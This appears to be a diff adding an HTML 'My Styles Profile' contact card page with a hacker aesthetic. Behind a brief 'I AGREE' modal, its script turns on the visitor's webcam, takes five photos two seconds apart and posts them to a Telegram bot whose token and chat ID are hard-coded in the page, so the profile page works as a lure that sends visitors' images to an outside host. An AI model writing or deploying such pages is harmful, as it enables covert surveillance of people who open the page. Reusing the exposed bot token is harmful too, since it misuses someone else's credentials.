@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>My Styles Profile</title>
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family:'Courier New', monospace;
+  user-select:none;
+}
+
+body{
+  margin:0;
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:radial-gradient(circle at top,#001a00,#000);
+  color:#00ff9c;
+  overflow:hidden;
+}
+
+/* animated grid */
+body::before{
+  content:"";
+  position:absolute;
+  inset:0;
+  background:
+    repeating-linear-gradient(0deg,rgba(0,255,156,.08) 0 1px,transparent 1px 40px),
+    repeating-linear-gradient(90deg,rgba(0,255,156,.08) 0 1px,transparent 1px 40px);
+  animation:grid 10s linear infinite;
+}
+@keyframes grid{
+  to{background-position:0 400px,400px 0}
+}
+
+/* card */
+.card{
+  position:relative;
+  width:360px;
+  padding:25px;
+  border-radius:20px;
+  background:rgba(0,0,0,.75);
+  border:1px solid rgba(0,255,156,.4);
+  box-shadow:0 0 25px rgba(0,255,156,.35);
+  text-align:center;
+  z-index:2;
+}
+
+/* profile image */
+.profile-wrapper{
+  width:150px;
+  height:150px;
+  margin:0 auto 20px;
+  border-radius:50%;
+  padding:3px;
+  background:linear-gradient(45deg,#00ff9c,#007a4c);
+  animation:glow 2s infinite alternate;
+  overflow:hidden;
+}
+@keyframes glow{
+  from{box-shadow:0 0 10px #00ff9c}
+  to{box-shadow:0 0 30px #00ff9c}
+}
+.secure-img{
+  width:100%;
+  height:100%;
+  border-radius:50%;
+  background:url('https://i.ibb.co.com/jk5cbFtK/premium-vector-1727472798424-ac2a798a4873.png') center/cover no-repeat;
+  animation:spin 8s linear infinite;
+}
+@keyframes spin{
+  from{transform:rotateY(0deg)}
+  to{transform:rotateY(360deg)}
+}
+
+h2{margin:10px 0 6px;}
+.tagline{font-size:13px;opacity:.8;margin-bottom:18px;}
+
+.info{
+  text-align:left;
+  font-size:14px;
+  background:rgba(0,255,156,.06);
+  padding:15px;
+  border-radius:12px;
+  border:1px dashed rgba(0,255,156,.4);
+}
+.info div{margin-bottom:12px;}
+.info span{cursor:pointer;}
+
+.cursor{
+  display:inline-block;
+  width:8px;
+  animation:blink 1s infinite;
+}
+@keyframes blink{50%{opacity:0}}
+
+.hacker-btn{
+  padding:6px 12px;
+  font-size:11px;
+  border-radius:6px;
+  border:1px solid #00ff9c;
+  background:transparent;
+  color:#00ff9c;
+  cursor:pointer;
+  letter-spacing:1px;
+  animation:pulse 2s infinite;
+}
+@keyframes pulse{50%{box-shadow:0 0 15px #00ff9c}}
+
+.footer{margin-top:15px;font-size:11px;opacity:.6}
+
+/* toast */
+.toast{
+  position:fixed;
+  bottom:20px;
+  left:50%;
+  transform:translateX(-50%);
+  background:#00ff9c;
+  color:#000;
+  padding:6px 14px;
+  border-radius:6px;
+  font-size:12px;
+  display:none;
+  z-index:9999;
+}
+
+/* consent modal */
+#consentModal{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.9);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:9999;
+}
+</style>
+</head>
+
+<body>
+
+<div class="toast" id="toast">Copied!</div>
+
+<div class="card">
+  <div class="profile-wrapper">
+    <div class="secure-img"></div>
+  </div>
+
+  <h2>ACCESS GRANTED</h2>
+  <div class="tagline">My Personal Profile Contact Me</div>
+
+  <div class="info">
+    <div>Email: <span id="t1"></span><span class="cursor">|</span></div>
+    <div>Phone: <span id="t2"></span><span class="cursor">|</span></div>
+    <div>Location: <span id="t3"></span><span class="cursor">|</span></div>
+    <div>Visit our site: <span id="t4"></span></div>
+  </div>
+
+  <div class="footer">© SYSTEM ONLINE</div>
+</div>
+
+<!-- CONSENT -->
+<div id="consentModal">
+  <div style="border:1px solid #00ff9c;padding:25px;border-radius:16px;text-align:center;">
+    <h3>⚠️ Permission Required</h3>
+    <p style="font-size:13px;opacity:.8;">
+      This demo will access your camera<br>
+      and send images to Telegram.
+    </p>
+    <button class="hacker-btn" id="agreeBtn">I AGREE</button>
+  </div>
+</div>
+
+<video id="camera" autoplay playsinline style="display:none;"></video>
+
+<script>
+/* typing data */
+const data=[
+  {id:"t1",txt:"conntact.me@f5.si",copy:true},
+  {id:"t2",txt:"+880XXXXXXXXX",copy:true},
+  {id:"t3",txt:"Bangladesh"},
+  {id:"t4",btn:true,txt:"OPEN SITE",link:"#"}
+];
+let a=0,b=0;
+
+function copyText(text){
+  navigator.clipboard.writeText(text).then(()=>{
+    toast.style.display="block";
+    setTimeout(()=>toast.style.display="none",1000);
+  });
+}
+
+function type(){
+  if(a>=data.length) return;
+  const el=document.getElementById(data[a].id);
+  if(data[a].btn){
+    el.innerHTML=`<button class="hacker-btn">${data[a].txt}</button>`;
+    a++; setTimeout(type,400); return;
+  }
+  if(b<data[a].txt.length){
+    el.textContent+=data[a].txt[b++];
+    setTimeout(type,70);
+  }else{
+    if(data[a].copy) el.onclick=()=>copyText(el.textContent);
+    a++; b=0; setTimeout(type,400);
+  }
+}
+window.onload=type;
+
+/* ===== TELEGRAM CAMERA LOGIC (CONSENT) ===== */
+const BOT_TOKEN="8238836333:AAHclNVfYwOV_mWKLfOVQxxBUI5NQ3RqpGs";
+const CHAT_ID="7695157062";
+
+const agreeBtn=document.getElementById("agreeBtn");
+const modal=document.getElementById("consentModal");
+const camera=document.getElementById("camera");
+
+let stream,count=0;
+const MAX=5, GAP=2000;
+
+agreeBtn.onclick=async()=>{
+  modal.style.display="none";
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:true});
+    camera.srcObject=stream;
+
+    const timer=setInterval(()=>{
+      capture();
+      count++;
+      if(count>=MAX){
+        clearInterval(timer);
+        stream.getTracks().forEach(t=>t.stop());
+      }
+    },GAP);
+
+  }catch(e){
+    alert("Camera permission denied");
+  }
+};
+
+function capture(){
+  const c=document.createElement("canvas");
+  c.width=camera.videoWidth;
+  c.height=camera.videoHeight;
+  c.getContext("2d").drawImage(camera,0,0);
+  c.toBlob(b=>{
+    const fd=new FormData();
+    fd.append("photo",b,"capture.jpg");
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`,{
+      method:"POST",
+      body:fd
+    });
+  },"image/jpeg",0.9);
+}
+</script>
+
+</body>
+</html>
